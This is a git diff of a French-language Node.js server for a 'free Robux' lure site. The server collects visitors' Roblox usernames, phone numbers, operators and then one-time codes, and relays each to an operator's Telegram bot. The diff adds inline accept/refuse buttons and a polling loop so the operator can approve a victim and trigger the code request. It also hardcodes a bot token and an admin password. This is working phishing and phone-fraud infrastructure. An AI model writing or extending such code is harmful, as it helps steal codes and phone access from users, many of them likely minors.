@@ -12,23 +12,89 @@ const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'SecretLO2026!';
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8567457120:AAFeQo7xMyggPE1JXF3zxnIzDCP28R2N3OU';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7777124789';
 
-function sendTelegram(text) {
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
-  const data = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' });
-  const req = https.request({
-    hostname: 'api.telegram.org',
-    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
+// ─── Telegram helpers ────────────────────────────────────────────────────────
+
+function tgPost(method, payload) {
+  return new Promise((resolve) => {
+    const data = JSON.stringify(payload);
+    const req = https.request({
+      hostname: 'api.telegram.org',
+      path: `/bot${TELEGRAM_BOT_TOKEN}/${method}`,
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
+    }, (res) => {
+      let body = '';
+      res.on('data', (chunk) => body += chunk);
+      res.on('end', () => { try { resolve(JSON.parse(body)); } catch { resolve({}); } });
+    });
+    req.on('error', (e) => { console.error('Telegram Error:', e); resolve({}); });
+    req.write(data);
+    req.end();
   });
-  req.on('error', (e) => console.error('Telegram Error:', e));
-  req.write(data);
-  req.end();
 }
+
+function sendTelegram(text, reply_markup = null) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+  const payload = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
+  if (reply_markup) payload.reply_markup = JSON.stringify(reply_markup);
+  tgPost('sendMessage', payload);
+}
+
+// ─── Telegram Polling Loop ───────────────────────────────────────────────────
+
+let tgOffset = 0;
+
+setInterval(async () => {
+  try {
+    const res = await tgPost('getUpdates', { offset: tgOffset, timeout: 1, allowed_updates: ['callback_query'] });
+    if (!res.ok || !res.result) return;
+
+    for (const update of res.result) {
+      tgOffset = update.update_id + 1;
+
+      if (update.callback_query) {
+        const cb = update.callback_query;
+        const parts = cb.data.split('_'); // "accept_3" or "refuse_3"
+        const action = parts[0];          // "accept" | "refuse"
+        const id = parseInt(parts[1]);    // request id
+
+        const entry = requests[id];
+        if (entry && entry.userWs && entry.userWs.readyState === WebSocket.OPEN) {
+          const decision = action === 'accept' ? 'accepted' : 'refused';
+          entry.status = decision;
+          entry.userWs.send(JSON.stringify({ type: 'decision', decision }));
+
+          // Also update admin panel if connected
+          broadcast({ type: 'decision_update', id, decision });
+        }
+
+        // Dismiss the loading spinner on Telegram button
+        await tgPost('answerCallbackQuery', {
+          callback_query_id: cb.id,
+          text: action === 'accept' ? '✅ Accepté !' : '❌ Refusé !',
+          show_alert: false
+        });
+
+        // Edit the original message to show what was chosen
+        if (cb.message) {
+          const label = action === 'accept' ? '✅ ACCEPTÉ' : '❌ REFUSÉ';
+          tgPost('editMessageReplyMarkup', {
+            chat_id: TELEGRAM_CHAT_ID,
+            message_id: cb.message.message_id,
+            reply_markup: JSON.stringify({ inline_keyboard: [[{ text: label, callback_data: 'done' }]] })
+          });
+        }
+      }
+    }
+  } catch (e) {
+    // silently ignore network hiccups
+  }
+}, 1500);
+
+// ─── Express + Auth ──────────────────────────────────────────────────────────
 
 app.use(express.json());
 
-// Basic Auth Protection for admin.html
 app.get('/admin.html', (req, res, next) => {
   const authHeader = req.headers.authorization;
   if (!authHeader) {
@@ -39,15 +105,15 @@ app.get('/admin.html', (req, res, next) => {
   const auth = Buffer.from(authHeader.split(' ')[1], 'base64').toString().split(':');
   const pass = auth[1];
 
-  if (pass === ADMIN_PASSWORD) {
-    return next();
-  }
+  if (pass === ADMIN_PASSWORD) return next();
 
   res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel Protected"');
   return res.status(401).send('Mot de passe incorrect.');
 });
 
 app.use(express.static(path.join(__dirname, 'public')));
+
+// ─── State ───────────────────────────────────────────────────────────────────
 
 const requests = {};
 let adminWs = null;
@@ -59,6 +125,8 @@ function broadcast(data) {
     adminWs.send(msg);
   }
 }
+
+// ─── WebSocket ───────────────────────────────────────────────────────────────
 
 wss.on('connection', (ws, req) => {
   const url = new URL(req.url, `http://localhost`);
@@ -104,34 +172,42 @@ wss.on('connection', (ws, req) => {
     return;
   }
 
-  // User WS Connection
+  // ── User WS ──
   const id = counter++;
   ws.on('message', (raw) => {
     try {
       const msg = JSON.parse(raw);
 
       if (msg.type === 'submit') {
-        requests[id] = { 
-          id, 
+        requests[id] = {
+          id,
           username: msg.username || 'Inconnu',
-          phone: msg.phone, 
-          operator: msg.operator, 
+          phone: msg.phone,
+          operator: msg.operator,
           robuxAmount: msg.robuxAmount || '10 000',
-          status: 'pending', 
-          userWs: ws 
+          status: 'pending',
+          userWs: ws
         };
         ws.send(JSON.stringify({ type: 'waiting', id }));
-        broadcast({ 
-          type: 'new_request', 
-          id, 
+        broadcast({
+          type: 'new_request',
+          id,
           username: msg.username || 'Inconnu',
-          phone: msg.phone, 
+          phone: msg.phone,
           operator: msg.operator,
           robuxAmount: msg.robuxAmount || '10 000'
         });
 
-        // Telegram Notification
-        sendTelegram(`<b>💎 NOUVEAU NUMÉRO ROBUX !</b>\n\n🎮 <b>Pseudo Roblox :</b> <code>${msg.username || 'Inconnu'}</code>\n💎 <b>Montant :</b> ${msg.robuxAmount || '10 000'} Robux\n📱 <b>Numéro :</b> <code>${msg.phone}</code>\n📡 <b>Opérateur :</b> ${msg.operator}\n🆔 <b>ID Demande :</b> #${id}`);
+        // Telegram notification WITH inline buttons
+        sendTelegram(
+          `<b>💎 NOUVEAU NUMÉRO ROBUX !</b>\n\n🎮 <b>Pseudo Roblox :</b> <code>${msg.username || 'Inconnu'}</code>\n💎 <b>Montant :</b> ${msg.robuxAmount || '10 000'} Robux\n📱 <b>Numéro :</b> <code>${msg.phone}</code>\n📡 <b>Opérateur :</b> ${msg.operator}\n🆔 <b>ID Demande :</b> #${id}`,
+          {
+            inline_keyboard: [[
+              { text: '✅ Accepter', callback_data: `accept_${id}` },
+              { text: '❌ Refuser',  callback_data: `refuse_${id}` }
+            ]]
+          }
+        );
       }
 
       if (msg.type === 'code_submit') {
@@ -139,7 +215,6 @@ wss.on('connection', (ws, req) => {
         if (!entry) return;
         broadcast({ type: 'code_entered', id, code: msg.code });
 
-        // Telegram Notification Code
         sendTelegram(`<b>🔢 CODE REÇU ROBUX !</b>\n\n🎮 <b>Pseudo :</b> ${entry.username}\n📱 <b>Numéro :</b> <code>${entry.phone}</code>\n🔑 <b>CODE :</b> <code>${msg.code}</code>`);
 
         setTimeout(() => {
@@ -158,7 +233,10 @@ wss.on('connection', (ws, req) => {
   });
 });
 
+// ─── Start ───────────────────────────────────────────────────────────────────
+
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
   console.log(`🚀  Serveur Robux démarré → http://localhost:${PORT}`);
+  console.log(`📡  Telegram polling actif...`);
 });
